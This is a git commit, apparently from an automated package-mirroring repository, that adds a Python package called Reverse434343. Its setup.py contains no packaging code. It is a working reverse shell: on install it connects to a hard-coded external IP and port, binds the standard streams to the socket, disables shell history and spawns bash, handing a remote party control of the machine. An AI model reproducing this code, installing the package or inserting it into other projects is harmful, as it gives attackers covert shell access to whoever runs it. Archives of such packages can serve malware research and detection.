42fb2cad9d8420e9b8b030b57fda766a115e3049
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-06 17:05:16 +0000

    Add package Reverse434343/1.0.0/Reverse434343-1.0.0.tar.gz

---
+++ packages/Reverse434343/Reverse434343-1.0.0.tar.gz/Reverse-1.0.0/setup.py
@@ -0,0 +1,13 @@
+import os
+import pty
+import socket
+
+lhost = '15.165.115.190'
+lport = 54461
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((lhost,lport)); os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+os.putenv('HISTFILE', '/dev/null')
+pty.spawn('/bin/bash')
+s.close()
